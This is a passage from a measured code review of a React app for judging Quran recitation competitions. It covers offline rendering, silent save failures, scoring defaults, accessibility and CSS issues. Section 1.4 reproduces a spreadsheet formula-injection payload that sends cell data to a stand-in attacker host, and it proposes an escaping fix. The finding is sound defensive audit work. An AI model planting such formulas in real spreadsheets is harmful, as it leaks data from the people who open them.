# Tahqeeq: a ground-up code review

> Reviewed 18–27 August 2026 against `main` at `b856944`, on a working tree made
> byte-identical to it. Baseline: **309 tests pass, build clean** — re-verified
> after the review, with the tree still clean.
>
> Every claim below was measured or reproduced, not inferred. Where a fix is
> proposed, the evidence for it is quoted. Where I could not verify something, it
> says so — and where a measurement turned out to be wrong, §3.8 says that too.

## 0. The one-paragraph version

The application is in good shape structurally — no `dangerouslySetInnerHTML`,
zero TODO/FIXME markers, a real design-token system, 309 passing tests, and a
domain model (judge sections, revisions, manifests, ledger events) more carefully
thought out than most products this size. The reducer in particular is genuinely
well engineered (§2.8), and text contrast passes in both themes across 550
measured runs (§3.8).

Two patterns account for nearly every finding below.

**The first is failure discipline.** The worst problems share one shape: a
foreseeable failure is caught and discarded, so the app keeps looking correct
while doing nothing. Offline, with the service worker installed and working
exactly as designed, the Mushaf renders **zero of 604 pages** while the fallback
font sits cached and unused — because one `Promise.all` treats a third-party font
as required, in a codebase where three other places deliberately treat it as
optional (§1.1). In a product whose entire purpose is to be the trustworthy
record of a competition, silent failure is the defect class that matters most.

**The second is knowledge that lives in prose instead of in an assertion.** The
44px rule is implemented well and gated behind a query no tablet matches (§3.7).
The contrast standard is worked out in a CSS comment, and the one colour that
misses it misses it against the surfaces the app actually paints (§3.9). The
service worker's cache version must be bumped by hand, and a test pins the
literal that discourages bumping it (§2.6). The reducer's safety guards are the
most carefully reasoned code in the repository and the least tested (§2.8). None
of these are ignorance. They are all the same gap between knowing a rule and
enforcing it.

Fix the nine phase-1 items and this is a product you can run an official
competition on. Phase 2 is an afternoon. Everything after that is craft.

---

## 1. Severity 1 — correctness, data loss, security

### 1.1 The Mushaf dies when a third-party font CDN is unreachable

**Reproduced.** With the page JSON serving normally (`/pages/p604.json` → 200,
valid) but `static-cdn.tarteel.ai` unreachable, the entire judging surface
renders as *"The requested page could not be opened."* — one DOM node, no text.

`src/components/Mushaf.tsx:259`:

```ts
const [data, fontLoaded] = await Promise.all([
  loadPage(page),
  loadQcfPageFont(page).then(() => true),   // ← no .catch()
]);
```

`Promise.all` rejects if either input rejects. The font promise has no rejection
handler, so a CDN failure rejects the whole load and lands in
`.catch(() => setLoadError(true))` at `:276`.

The bitter part: **the fallback already exists and is unreachable.** `:796`
reads `qcfReady && word.glyph ? word.glyph : word.text`, and `hafs.18.woff2`
(86 KB Uthmani) is bundled locally. The code was written to degrade; the
coupling prevents it.

**Fix — one line:**

```ts
loadQcfPageFont(page).then(() => true).catch(() => false),
```

**Verified.** With that change and the CDN still failing: error banner gone,
`.m-line` node count 1 → 12, all three sūrahs of page 604 rendering correctly in
the local Uthmani face, `data-font-ready="false"` as designed.

This is the highest-value line of code in the review. A competition hall with
weak wifi, a corporate firewall, or a CDN incident currently means *no judging*.

**And it is worse than one page.** The service worker precaches exactly **one**
font — `QCF_DEFAULT_FONT` at `public/sw.js:24`, page 604's — while the app
requests a **per-page** font (`qcfFontAssetUrl(page)` → `p{page}.woff2`, called
per page by `Mushaf.tsx`). Font requests are served cache-first
(`sw.js` fetch handler), so offline:

- page 604 → font cached → renders
- **any of the other 603 pages** → cache miss → network → fails → §1.1 kills the page

So on paper, offline, the app judges **1 of 604 pages**. The optional full
download (`offlineMushaf.ts`, `offlineMushafAssetPairs()`) closes this — it
enumerates all 604 page/font pairs — but it is opt-in, and it is 9.3 MB of page
JSON plus 604 font files.

**Confirmed against a production build, service worker active, network genuinely
offline** — the check this review's first draft listed as not-yet-done. `npm run
build` output served over `localhost:8088`, SW allowed to install and activate,
then `Network.emulateNetworkConditions {offline: true}` and a reload:

```
SW state   : {registrations:1, controller:true, active:"activated",
              caches:{ static-app-v29: 13,
                       mushaf-pages-v1: 1,
                       mushaf-fonts-qcf-v1-3.1: 0 }}   ← zero
fonts held : ["/fonts/hafs.18.woff2", "/fonts/InterVariable.woff2"]  ← both local
offline    : shell loads, title correct, competition and roster intact
Mushaf     : {lines: 0, words: 0, errorShown: true}
```

Two things this changes. First, the QCF font cache installed **empty**: the
cross-origin precache is deliberately best-effort (`Promise.allSettled`,
`sw.js:65`), so when the CDN is unreachable *at install time* the app ships with
zero QCF fonts, and the real offline figure is **0 of 604 pages**, not 1. Second,
`hafs.18.woff2` **was cached and available the whole time** — the fallback font
was sitting in the cache while the screen said the page could not be opened.

**The deepest form of the finding: the codebase already disagrees with itself.**
Three separate places treat the QCF font as optional, all of them deliberate:

| Location | Treatment | Evidence of intent |
| --- | --- | --- |
| `sw.js:65` | `Promise.allSettled` | comment `:52` — *"so a temporary cross-origin font failure cannot prevent an otherwise usable application update from installing"* |
| `qcfFont.ts:45` | `preloadQcfPageFont` → `.catch(() => {})` | the preload path swallows it by design |
| `Mushaf.tsx:796` | `qcfReady && word.glyph ? word.glyph : word.text` | a written, tested fallback render path |
| **`Mushaf.tsx:259`** | **`Promise.all`, required** | **the one on the critical path** |

The service worker's author wrote down the assumption — *an otherwise usable
application* — and shipped an 86 KB local Uthmani face to honour it. One
`Promise.all` on the render path makes that assumption false. The one-line fix
is not a patch over a missing feature; it is making the render path agree with
the three decisions already made around it.

Compounding it: `Mushaf.tsx` never consults `navigator.onLine`, so the message a
judge sees is *"The requested page could not be opened"* whether the device is
offline, the CDN is down, or something is genuinely broken.

**Two more fixes follow from this:**

- Precache the **local** Uthmani face (`/fonts/hafs.18.woff2`, 86 KB, already in
  `STATIC_PRECACHE_URLS`' neighbourhood) as the guaranteed floor, so every page
  has a renderable font offline without the 9.3 MB download.
- Distinguish offline from broken in the error, and say which page and what to
  do — "Page 481 needs the offline Mushaf download" is actionable; the current
  string is not.

### 1.2 A failed save is silent

`src/state/store.tsx:1647`:

```ts
useEffect(() => {
  try {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
  } catch {
    /* ignore quota errors */
  }
}, [state]);
```

Nothing anywhere in `src/` surfaces a write failure — the only other mention of
quota is a second silent catch at `:1606`. Once the quota is hit, a judge marks
mistakes for the rest of a recitation and **none of it persists**, with no
indication until reload.

For an accountability product this is the worst possible failure mode: the
screen says the work is recorded and it is not.

**Fix:** treat a failed write as a first-class application state. Surface a
persistent, non-dismissible banner ("Marks are not being saved"), stop the
session from being finalizable, and offer the backup download as the escape
hatch. A `try/catch` that swallows is acceptable only where the caller can
genuinely continue; this caller cannot.

### 1.3 Ten copies of the state, one of them useful

Measured in the running app with sample data only:

| | |
| --- | --- |
| Live state (`tahqeeq.session.v1`) | 101,153 chars |
| Total localStorage for the origin | **1,249,434 chars** |
| Redundant backup keys | **9**, each 127,475 chars, all identical |

`store.tsx:1591` writes a full copy of state into nine `PRE_*_BACKUP_KEY`s on
first load after each migration. They are never pruned. localStorage is capped
at roughly **5 MB** in every major browser — and `navigator.storage.estimate()`
does *not* report that cap (it reported 154 GB here), so the app cannot detect
its own ceiling through that API.

With 8 sample participants the app already holds 1.25 MB. A 100-participant
competition with full mistake ledgers plausibly exceeds 5 MB — at which point
§1.2 fires, silently.

**Fixes, in order:** prune migration backups once the migration is confirmed
(keep at most one); move the live record to IndexedDB, which is quota-estimable
and asynchronous; keep localStorage for device preferences only.

### 1.4 Spreadsheet formula injection — a documented requirement, unimplemented

`PRODUCT_FOUNDATION.md` §10.5 states: *"All human-controlled strings must be
escaped against spreadsheet/CSV formula injection (`=`, `+`, `-`, `@`, tabs, and
line prefixes as applicable)."*

Grepping `finalResultsWorkbook.ts`, `judgeRecordsWorkbook.ts` and
`resultPackages.ts` for any escaping returns nothing. Participant name,
institution and revision reason are written straight into cells
(`finalResultsWorkbook.ts:122`, `:126`, `:237`).

**Reproduced.** Building a workbook with a participant named
`=HYPERLINK("https://evil.example/"&A1,"CLICK")` and institution `@SUM(1+1)`,
then reading the sheet back:

```
Name cell   : "=HYPERLINK(\"https://evil.example/\"&A1,\"CLICK\")"
Institution : "@SUM(1+1)"
UNESCAPED — 2 cells begin with a formula trigger
```

Excel and Google Sheets evaluate these on open. The roster is imported from
spreadsheets supplied by participating schools, so the hostile string does not
even need an insider.

**Fix:** one `escapeCell()` helper prefixing `'` to any string starting with
`= + - @ Tab CR`, applied at every workbook and CSV boundary. Add a test with
the payload above. This is perhaps 20 lines and closes a real vulnerability.

### 1.5 No error boundary anywhere

`grep -rn "componentDidCatch|ErrorBoundary|getDerivedStateFromError" src/` →
nothing.

Any render-time throw unmounts the whole tree to a white screen. This is not
hypothetical — during earlier work in this repository a single bad property read
(`Cannot read properties of undefined (reading 'ageGroup')`) blanked the entire
application. Mid-recitation, that is unrecoverable in the moment.

**Fix:** an error boundary around the judging stage and another around each
route-level view, rendering a "something broke — your marks are saved, reload"
panel plus a backup-download button. Cheap, and it converts a catastrophe into
an inconvenience.

### 1.6 The audit reason is still a `window.prompt`

`src/components/FinalResultsPanel.tsx:165`. The field that makes an official
revision accountable is collected through a browser dialog: unstyleable,
unvalidatable, no character limit, no record of what was typed if the dialog is
dismissed, and blocked outright in some embedded/WebView contexts — where
finalizing a revision then becomes impossible with no error.

It is the only `window.prompt` left in the application.

**Fix:** a required textarea in the result detail, with Finalize disabled until
it carries text. (A worked implementation exists on
`origin/claude/result-screen-redesign-erk238` at `ec58e5d` if useful.)

### 1.7 The roster import has no bounds of any kind

`roster.ts` (1,270 lines) is where untrusted data enters the product — schools
send spreadsheets, an organiser imports them. The structural validation is
decent: `normalizeRosterDraft()` coerces every field through `String()`, and
`validateRosterDraft()` enforces required fields with errors and warnings.

What is missing is **any bound at all**. Grepping the whole module for
`file.size`, `MAX`, `maxRows` or a truncating `slice(0, n)` returns nothing.
`parseRosterFile()` reads the file wholesale (`await file.arrayBuffer()`) and
parses every row into state. There is no cap on:

- file size
- row count
- individual field length

This is not primarily an attack surface — it is an accident surface. A
spreadsheet with a stray selection extending to row 50,000, or a cell holding a
pasted document, imports cleanly and lands in state, which lands in
localStorage, which hits §1.3's ceiling and fails via §1.2 — **silently**, in
the middle of setting up a competition.

**Fix:** cap the file at a few MB with a clear message, cap rows at something
defensible (500?), and truncate individual fields to a sane length at the
`normalizeRosterDraft` boundary where the `String()` coercion already happens.
Each is one line at a place the code already touches every field.

### 1.8 Unmarked impression criteria default to full marks, and the official record cannot say so

`scoring.ts:32`:

```ts
export function impressionScore(
  config, impressions, category,
  unmarkedMode: UnmarkedImpressionMode = "legacy-full",   // ← the lenient one is the default
) {
  const mark = impressions.find((item) => item.category === category);
  if (!mark || !mark.set) {
    return { awarded: unmarkedMode === "entry-zero" ? 0 : start, marked: false, ... };
```

An impression criterion (Adu & Raagu) that was never marked scores **full
marks** unless the caller explicitly opts out. Run against the real
`DEFAULT_CONFIG` with identical evidence and no impression mark:

```
rubric: jali=50 khafi=30 fasaha=10 adu-raagu=10

legacy-full   total=95  /100   adu-raagu=10/10   marked=false
entry-zero    total=85  /100   adu-raagu= 0/10   marked=false
                    ↑ 10 marks — 10% of the competition scale
```

**Which callers take which default:**

| Call site | Mode | What it decides |
| --- | --- | --- |
| `store.tsx` → `computeScores` `:160` | `entry-zero` | the live judging total |
| `finalResults.ts:172` | **default** | **the official finalized result** |
| `ParticipantResultDetail.tsx:70` | **default** | the result shown on screen |
| `store.tsx:1253` | **default** | reconstructed / imported sessions |

Note `marked: false` in both rows of the output. The data knows the criterion
was never judged. The lenient path awards ten out of ten anyway.

**In fairness, the live path is well defended.** `missingRequiredImpressionCategories()`
is wired into five places — `ScorePanel:102`, `FinishDialog:113`, `App:311`, and
most importantly the reducer itself at `store.tsx:1064`, where `FINISH_SESSION`
returns the state unchanged if any assigned impression criterion is unmarked. A
session finalized through the UI cannot reach this state. The comment at `:30`
also says the leniency is deliberate — *"Saved-session callers keep the
historical full-mark fallback"* — so this is a compatibility decision, not an
oversight.

**The problem is the polarity, and one missing field.**

1. **The unsafe behaviour is the default.** Three of four call sites inherit it
   by saying nothing, and one of those three produces the official result. Any
   future caller inherits it too. The legacy fallback should be the mode you
   have to *ask* for — `"legacy-full"` spelled out at the one site that needs
   it — so that forgetting produces a conservative score rather than a generous
   one.
2. **`FinalizedCategoryScore` has no `marked` field** (`types.ts:480–488`:
   category, score, max, sessionId, sessionRevision, judgeSeatId, judgeName).
   So once a result is finalized, the artifact carrying a manifest and a
   revision number — the thing the competition is adjudicated on — is unable to
   record that a 10/10 was defaulted rather than awarded. `ResultSheet.tsx:127`
   already renders exactly this distinction (*"Marked"* / *"Not marked"*), which
   shows the concept exists in the codebase; it simply does not survive
   finalization.

**A second, smaller edge from the same file:** `computeAssignedScores()` narrows
`total` to the judge's assigned categories but returns the **unnarrowed**
`byCategory` alongside it. A judge assigned only Jalī yields `total 46/50` and,
in the same object, `byCategory["adu-raagu"] = 10/10, marked: false` — a full
score for a criterion this judge was never given. Consumers that read `total` are
fine; any that reach into `byCategory` are reading a number that was never
judged by anyone. Returning `byCategory` narrowed to `ids`, or marking the
others, removes the trap.

**Fix:** flip the default, add `marked` to `FinalizedCategoryScore` and carry it
into the result detail and the workbook, and narrow `byCategory` in
`computeAssignedScores`. None of this changes a single correctly judged score.

---

## 2. Severity 2 — architecture and performance

### 2.1 One context, nineteen consumers, every dispatch

`store.tsx:1655`: `const value = useMemo(() => ({ state, dispatch }), [state])`.

Because the memo depends on the whole state object, **every** dispatch produces
a new context value and re-renders all **19** components that call
`useJudging()` — including `Mushaf.tsx` (1,029 lines) and `RecordsView.tsx`
(1,240 lines). Marking one letter re-renders the results screen.

**Fix:** split into two contexts — a stable `dispatch` context and a state
context — then add selector subscriptions (`useSyncExternalStore`, or `zustand`
/ `jotai` if a dependency is acceptable) so a component re-renders only for the
slice it reads.

### 2.2 The whole state is serialized on every dispatch

Measured in-browser at the current 101 KB state:

| | |
| --- | --- |
| `JSON.stringify(state)` | 0.25 ms |
| `localStorage.setItem` | 0.92 ms |
| **Per dispatch** | **1.17 ms** |

Fine today. It scales linearly with state, and it is synchronous on the main
thread. At a realistic 100-participant competition (~1.2 MB state) that becomes
roughly **14 ms of blocking work on every mark**, on top of §2.1's re-renders —
inside the interaction budget of a judge pressing a letter while listening.

**Fix:** debounce the write (~250 ms trailing) and move it off the critical
path; with IndexedDB (§1.3) it becomes asynchronous anyway. Persist deltas
rather than the whole document if the ledger allows.

### 2.3 1.8 MB of JavaScript, including two spreadsheet libraries

```
dist/assets/exceljs.min-*.js   940.37 kB │ gzip: 271.39 kB
dist/assets/index-*.js         533.87 kB │ gzip: 154.65 kB
dist/assets/xlsx-*.js          333.02 kB │ gzip: 113.89 kB
dist/assets/index-*.css        228.39 kB │ gzip:  37.78 kB
```

`exceljs` **and** `xlsx` are both imported by the same three modules
(`finalResultsWorkbook.ts`, `judgeRecordsWorkbook.ts`, `roster.ts`). That is
1.27 MB — 385 kB gzipped — of duplicated capability.

**Fix:** pick one. `exceljs` if styled output is required; `xlsx` if not. Then
confirm both are dynamically imported so they never enter the initial bundle
(they appear to be chunked already — worth verifying they are not eagerly
pulled by the judging path, which needs neither).

### 2.4 Prototypes ship to production

`public/` contains `results-redesign-checkpoint-1.html` (50 KB),
`results-table-architecture-checkpoint.html` (22 KB), `prototypes/` (88 KB) and
`downloads/` (20 KB). Everything in `public/` is copied verbatim into `dist/`
and served. That is ~180 KB of design scratch shipped to every user, publicly
reachable.

**Fix:** move design artefacts to `docs/` (which is not served) and keep
`public/` for real runtime assets only.

### 2.5 Dead computation in `stats.ts`

`avgScore` and `avgPercent` are computed by `computeRecords()` on every Analysis
render and consumed **nowhere** — `grep` across `src/` and `scripts/` outside
`stats.ts` returns nothing.

Worth noting *why* this is good news: `avgPercent` averaged `total/totalMax`
across judge sections with different rubrics, which was never a meaningful
number. Main removed it from the UI. Only the corpse remains.

**Fix:** delete both fields and the `pctSum`/`scoreSum` accumulators.

### 2.6 The app-shell cache version is manual, and a test punishes bumping it

`public/sw.js:11`:

```js
const APP_CACHE_VERSION = "app-v29";
```

The precache *list* is generated — `scripts/pwa-precache.mjs` injects Vite's
hashed filenames into the built worker, and it is well built: it refuses to
inject if the marker is missing or duplicated (`:38`) and if the build emitted
no JS or no CSS (`:24`, `:27`). But the cache *name* those files land in is
hand-typed.

The activate handler (`:83–100`) deletes stale cache **names** — `staleStatic`,
`stalePages`, `staleFonts`, each correctly scoped by prefix so the interface
version can never invalidate the 1405H page data. What nothing does is prune
stale **entries inside the current cache**. So on a release where the version is
not bumped:

- `sw.js` bytes change (new hashes) → browser installs the new worker
- `addAll` writes the new hashed assets into `tahqeeq-static-app-v29`
- the *previous* release's hashed assets are still there, still matching no
  request, never evicted

At ~1.8 MB of JS per build (§2.3), that is roughly 1.8 MB of dead weight per
unbumped release, on the device of a judge who may be on a phone.

**And the test suite makes the bump costly.** `scripts/pwa-shell.test.mjs:177`:

```js
assert.match(workerSource, /const APP_CACHE_VERSION = "app-v29"/);
```

The literal is pinned. Bumping to `app-v30` — the correct action — turns the
suite red, so the incentive under time pressure runs backwards. This is §4.1's
source-text-assertion problem with an operational cost attached rather than just
a refactoring cost, and it is the clearest single argument in the review for
fixing that test style.

**Fix.** `collectBuildPrecacheUrls()` already has every hashed filename in hand
at `:31`. Derive the version from a hash of that list and inject it the same way
the URL list is injected; the bump becomes automatic and unforgettable. The test
then asserts the behaviour that actually matters — *the cache name changes when
the shell changes* — instead of a string that has to be edited in two files.

### 2.7 The delivery layer sends no security headers

The entire server side is 21 lines (`worker/index.js`): pass the request to the
`ASSETS` binding, and on a GET 404 that accepts HTML, serve `/index.html` as the
SPA shell. That is the right shape and it is correctly guarded on both method
and `accept`.

What it does not do is set a single response header. There is no CSP, no
`X-Content-Type-Options`, no `Referrer-Policy`, no `Permissions-Policy`, and no
`_headers` file supplying them either (checked: none in `public/` or
`dist/client/`).

No CSP is defence-in-depth rather than an active hole — there is no
`dangerouslySetInnerHTML` anywhere and no user-supplied HTML path (§0). The
reason to add one here is that it is unusually cheap: **the application
references exactly one external origin**, `static-cdn.tarteel.ai`, in the whole
of `src/`, `public/` and `index.html`. So the policy is close to
`default-src 'self'` plus one `font-src` entry, and it doubles as executable
documentation of that dependency — the same dependency §1.1 is about. A CSP that
names the QCF CDN makes the coupling visible in a place a reviewer will look.

`Referrer-Policy: no-referrer` and `nosniff` are two lines and have no cost at
all.

### 2.8 The reducer is the integrity boundary — for 35 of its 43 cases

This section starts with credit, because the reducer is the best-engineered part
of the application and the review should say so before it criticises anything.

`ADD_MISTAKE` (`store.tsx:299`) refuses unless a session is active, an assignment
exists, **and** the criterion is one this judge was actually assigned. It then
treats a repeat press on an already-marked letter as a correction rather than a
second deduction, and scopes that to the judge's seat — with a five-line comment
explaining that picking the wrong criterion is an ordinary slip mid-recitation
while two judges marking the same letter are two real findings.

`RESTORE_MISTAKE` (`:355`) is stricter still, with five conditions: the source
event exists and is a `mistake_undone`; the session is active; the criterion is
assigned; the mistake is not already present; and this undo is the *latest*
event for that mistake — which is what stops a stale undo being replayed into a
resurrection. That is genuine event-sourcing discipline, and it is rare.

Add `FINISH_SESSION` refusing to finalize with an unmarked assigned impression
criterion (§1.8), and `SET_CONFIG` refusing to change the rubric once a
competition has left draft, and the pattern is clear: someone thought carefully
about what must not be possible.

**The gap is that the discipline is per-case rather than structural.** Counting
across all 43 cases, 35 carry an early-return guard and 8 do not:

```
SET_PARTICIPANT_ABSENT   SET_NOTES        SET_PARTICIPANT   CLEAR_MARKS
DELETE_SESSION           CLEAR_HISTORY    UPSERT_FINAL_RESULT
APPLY_TARGET_MIGRATION
```

Four of those eight are destructive or authoritative: `CLEAR_MARKS` appends a
`mistake_undone` for every mistake and blanks the notes; `DELETE_SESSION` and
`CLEAR_HISTORY` remove judging records; `UPSERT_FINAL_RESULT` writes the official
finalized result. None checks `sessionActive`, seat, or competition status.

There is also a narrower asymmetry inside the mistake family. `ADD_MISTAKE` and
`RESTORE_MISTAKE` check session and assigned-criterion; `REMOVE_MISTAKE`,
`SET_MISTAKE_AMOUNT` and `SET_MISTAKE_NOTE` check only that the mistake exists.

**Not currently reachable, and that is the point.** `MistakeLog` — the only
component that dispatches the three unguarded mistake actions — renders solely
under `state.sessionActive` (`App.tsx:240`), so the missing checks cannot fire
today. And `CLEAR_MARKS`, `DELETE_SESSION` and `CLEAR_HISTORY` have **no
dispatcher anywhere in `src/`**: three destructive, entirely unguarded actions
sitting in the union and the reducer with nothing calling them.

So this is not a live defect. It is the reason to make guards structural: in an
event-sourced design the reducer is the integrity boundary precisely so that
correctness does not depend on which component happens to render where. Today
three of these actions are safe because of a JSX condition in `App.tsx`, and
three more are safe because nobody calls them yet.

**Fix, in two cheap parts.** Delete the three destructive dead actions — they are
§2.5's dead-code pattern with a sharper edge. Then hoist the common
preconditions into one helper (`requireLiveSession`, `requireAssignedCategory`)
applied at the top of the mistake and impression families, so a new case
inherits the guards instead of having to remember them.

**And test them.** `judging-ledger.test.mjs` does not exercise a single reducer
guard — no test asserts that `ADD_MISTAKE` is refused without a session, or that
an unassigned criterion is rejected, or that a stale undo cannot be replayed.
The most carefully reasoned safety logic in the codebase is also the least
covered, while §4.1 counts hundreds of assertions checking how the source is
spelled. This is the single best place to spend a test-writing hour.

---

## 3. Severity 3 — design system, UI, UX

### 3.1 The design grammar has regressed, measurably

`DESIGN_GRAMMAR.md` rule 8 fixes the type scale at **12 / 14 / 15 / 17 / 21 /
27** and radii at **8 / 12 / 20**, and explicitly warns: *"The half-pixel sizes
these replaced came from nudging individual screens until each looked right,
which is exactly why no two agreed."*

Measured across all four stylesheets:

| | |
| --- | --- |
| `font-size` declarations | 605 |
| Distinct values | **56** |
| Px-valued declarations **off the fixed scale** | **373 of 496 (75%)** |
| Distinct px sizes | 32 — including 8.5, 9.5, 10.5, 11.5, **12.25**, 12.5, 13.5, 14.5 |
| Distinct `border-radius` values | **33** — every integer 1–12 |
| Distinct hex colour literals | **78**, despite a token system |
| `global.css` | **11,976 lines** (12,584 total CSS) |

The half-pixel nudging the grammar was written to stop has fully returned.

**Fix:** this needs a mechanical guard, not resolve. Add a stylelint rule (or a
test in the existing `scripts/*.test.mjs` style, which the repo already does
well) that fails on any `font-size` outside the six tokens and any
`border-radius` outside the three. Then convert in one pass. Without the guard
it will regress a third time.

### 3.2 The 44px rule is broken on the live judging screen

Rule 10: *"A control pressed during a live recitation is at least 44px."*

Measured on the landing/judging view: **10 of 11 controls are under 44px.** Page
navigation is **28px** (`next page`, `previous page`, `Pages 604. Jump to
page.`), the error `Retry` is 30px. On Results, 24 of 29 are under 44px, though
none below 32px.

The rule exists because a judge is listening to a person recite and cannot also
be aiming. The screen where it matters most is the screen that breaks it.

**§3.7 explains why, and it is not neglect.**

### 3.3 Document structure

The judging view has **no `<h1>`** — the outline starts at `<h2>Next reciter</h2>`
— and exposes only 2 landmarks. Results is better (one `h1`, correct h1→h2→h3→h4
nesting, 3 landmarks, 2 live regions).

### 3.4 The Results screen is 3,296 px tall

Most of it is the stored-judge-results list below the table (32 sessions). The
useful content is the first screen; everything after is a scroll tax on a
surface used under time pressure.

### 3.5 Standings are computed and barely surfaced

`placeFinalizedResults()` groups by age group and participant category, sorts by
ratio and resolves ties. Its entire output reaches the UI as
`{placed.place}` inside a `<small>` in `ParticipantResultDetail.tsx:302`, plus
the workbook. There is still no view that ranks a division on screen, though
winners-by-division is sheet 2 of the export `PRODUCT_FOUNDATION.md` §10.5
specifies.

*Credit where due:* main's current Results table (Participant / Total / State
with a segmented status filter) is a genuine improvement on what preceded it and
independently reached a similar conclusion to the redesign work on the side
branch. Adding Place and division grouping is a small step from here, not a
rewrite.

### 3.6 Ten dialogs, four different modal implementations

The app has ten modal surfaces. Three are native `<dialog>` driven by
`showModal()` — `FinishDialog.tsx:207`, `SettingsGuide.tsx:27`,
`OfflineMushafPrompt.tsx:68`. Those are correct for free: the browser moves
focus in, traps Tab, closes on Escape and makes everything behind the top layer
inert. The other seven are hand-rolled `<div role="dialog" aria-modal="true">`,
and each one re-implements a different subset of that behaviour:

| Surface | Focus moves in | Escape closes | Tab trapped | Focus restored | Backdrop click |
| --- | --- | --- | --- | --- | --- |
| `FinishDialog` / `SettingsGuide` / `OfflineMushafPrompt` (native) | yes | yes | yes | yes | — |
| `DragMenu.tsx:301` | yes `:117` | yes `:121` | yes `:142` | — | — |
| `MoreActionsPopover.tsx:156` | yes `:99` | yes `:83` | no | yes `:75` | — |
| `StartDialog.tsx:335` | **no** | handler at `:327`, never fires | no | no | yes `:330` |
| `ReopenSessionDialog.tsx:24` | yes `:17` | **no handler** | no | no | no |
| `ParticipantRosterEditor.tsx:593` (template) | **no** | **no handler** | no | no | no |
| `ParticipantRosterEditor.tsx:636` (paste) | `autoFocus` `:638` | **no handler** | no | no | no |
| `ParticipantRosterEditor.tsx:654` (review) | **no** | **no handler** | no | no | no |

`DragMenu` is the best of them and is genuinely well built — it traps Tab,
handles Escape, and adds arrow-key navigation across categories and units. It is
also proof that the knowledge exists in this codebase; it just was not shared.

**Measured, driving the app with real keyboard events** (`Input.dispatchKeyEvent`
over CDP, not synthetic `dispatchEvent` — a synthetic event on `document` would
never reach a React `onKeyDown` regardless, and would have proved nothing).
Opening the question board from the live judging screen:

```
open board       : {open:true, activeInModal:false, active:"BODY",
                    bgInert:false, bgAriaHidden:false,
                    focusOutsideModal:11, scrollLocked:true}
real Escape      : {stillOpen:true}
4 real Tabs      : {active:"BUTTON:More actions and view controls", inModal:false}
```

Three separate defects, in the order they bite:

1. **Focus never enters the dialog.** `document.activeElement` is still `<body>`
   after the board opens. A keyboard or screen-reader user is given no
   indication that anything happened.
2. **Escape does not close it — but the handler is correct.** `StartDialog.tsx:326`
   puts `onKeyDown` on `.dialog-backdrop`. React synthetic events propagate from
   the event target, and the target is `<body>`, which is outside that subtree,
   so the handler never runs. Focusing any control inside the dialog and
   pressing Escape closes it immediately:

   ```
   focus .dialog-close : {inModal:true}
   real Escape         : {stillOpen:false}
   ```

   So defect 2 is not a second bug. It is defect 1, and one `.focus()` call on
   open fixes both.
3. **Tab walks out of the modal into the page behind it.** Four Tab presses
   land on *More actions and view controls* — a button behind an 8px-blurred
   backdrop that the user cannot see. **Eleven** background controls stay
   focusable while the dialog is open (the dialog itself holds 22). Nothing is
   `inert`; nothing is `aria-hidden`. To a screen reader the whole page is still
   there, and `aria-modal="true"` is an assertion the DOM does not honour.

What already works and should be kept: `global.css:7694`
(`html:has(.dialog-backdrop) { overflow: hidden }`) locks background scroll for
every backdrop dialog at once — confirmed `scrollLocked:true` above. That is the
right instinct, applied in the right place; it is the rest of the modal contract
that never followed it there.

**The fix is one component, not seven.** A `<Modal>` wrapper — or converting the
seven to native `<dialog>` + `showModal()`, which is strictly less code — makes
focus entry, focus trap, Escape, focus restore and background inertness
structural rather than per-site. `DragMenu`'s arrow-key behaviour stays as its
own layer on top; `MoreActionsPopover`'s focus restore (`:75`) is the pattern
the wrapper should adopt for all of them. The native route also deletes the
`z-index: 80` stacking guess at `global.css:6384`, since the top layer has no
z-index to compete with.

This matters beyond compliance. The question board is on the path of every
single recitation, and `ReopenSessionDialog` gates an audited correction to a
finalized result — the two moments where a judge is least able to reach for a
mouse.
### 3.7 The 44px rule is implemented correctly — behind a query no tablet matches

Measured across four viewports, driving the app at each (device metrics
emulated, touch emulation on for the first three):

| Device | `pointer: coarse` | Nav button | Controls under 44px |
| --- | --- | --- | --- |
| iPhone 13, 390×844 | true | **44×44** | 2 of 10 (both 40px) |
| iPad portrait, 820×1180 | true | **28×28** | 10 of 10 |
| iPad landscape, 1180×820 | true | **28×28** | 10 of 10 |
| Laptop, 1400×900 | false | 28×28 | 9 of 10 |

The phone is the best-behaved screen in the application. Every tablet is the
worst. That is backwards, and a tablet on a desk is the likeliest judging
device there is.

The cause is one media condition, `global.css:9871`:

```css
@media (max-width: 600px),
  (min-width: 601px) and (max-width: 900px) and (max-device-width: 600px) and
    (pointer: coarse) and (orientation: portrait) {
```

and the comment sitting inside it at `:10021` quotes rule 10's own reasoning:

> *"Keep the approved compact navigation surfaces while making the actual
> previous/page/next controls large enough to hit without aiming."*

The work is done. `.page-nav-btn` becomes 44×44 with a `::before` inset by 8px
so the *visible* pill stays 28px while the *hit area* is 44px — which is exactly
the right technique, and better than simply making the button bigger. It is then
gated behind a width cap that excludes every device it was written for.

Both branches of the query cap device width at 600px. The second branch reads
like an attempt to catch tablets — it asks for `pointer: coarse` — but
`(max-device-width: 600px)` vetoes first, and no tablet has a device width at or
under 600px. So the branch can only fire on a phone the *first* branch has
already matched, which makes it close to dead code.

**The proof that the condition is asking the wrong question:** `pointer: coarse`
evaluates to **true** on both iPad cases above. The browser is telling the
stylesheet that this is a touch device, and the width caps overrule it.

**Fix.** The question rule 10 asks is *"is a finger doing this?"*, and
`(pointer: coarse)` already answers it. Split the query so touch sizing keys off
the pointer type alone and layout keys off width:

```css
@media (pointer: coarse) { /* 44px targets */ }
@media (max-width: 600px) { /* phone layout */ }
```

That is a smaller stylesheet than what is there now, and it turns three of the
four rows above green without touching a single component.

*Worth crediting alongside it:* at every one of those four widths the document
had **no horizontal overflow**, and the two places where content genuinely
exceeds a phone's width — the results ledger table (scrollWidth 440 in a 342px
box) and the status-filter row (390 in 334) — are both correctly wrapped in
`overflow-x: auto` containers rather than being allowed to push the page. The
responsive layout work is sound. It is only the target sizing that is gated
wrong.

### 3.8 Contrast, by contrast, has not regressed at all

Rule 9 asks for measured contrast. It is the one grammar rule that has held
completely. Every text run rendered on screen, measured against its actual
composited background in both themes:

| Screen | Theme | Text runs checked | Worst ratio | Failures |
| --- | --- | --- | --- | --- |
| Judging | light | 21 | 5.35 | **0** |
| Judging | dark | 21 | 5.03 | **0** |
| Results | light | 254 | 4.74 | **0** |
| Results | dark | 254 | 5.03 | **0** |

550 text runs, no failure, and the worst case anywhere — 4.74 against a 4.5
requirement — still clears. Both themes are held to the same standard, which is
the part most projects get wrong: dark mode is usually where contrast quietly
